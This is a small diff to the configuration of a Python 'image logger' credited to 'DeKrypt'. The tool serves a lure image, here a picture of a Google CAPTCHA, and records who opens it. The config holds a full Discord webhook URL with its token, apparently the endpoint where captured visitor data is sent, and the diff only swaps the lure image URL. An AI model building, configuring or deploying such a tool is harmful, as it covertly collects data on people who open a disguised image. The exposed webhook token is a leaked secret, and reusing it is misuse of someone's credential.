@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1346160293163569225/PbWwUufcyIYWOS0grz91gsR8BM2hVsxBetzVRxN_Ym7rdMzWLTWDjqdWGYb9IJmpkwDm",
-    "image": "https://images.bfmtv.com/8x8ofc-_TpJFr4pOfHy_c1f2L_U=/0x40:1264x751/1280x0/images/Exemple-de-Captcha-mis-en-place-par-Google-1436063.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://images.bfmtv.com/v8cvXlGt9YIiBRN4vCeRln2ncTg=/0x0:1280x800/1160x0/images/Exemple-de-Captcha-mis-en-place-par-Google-1436063.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
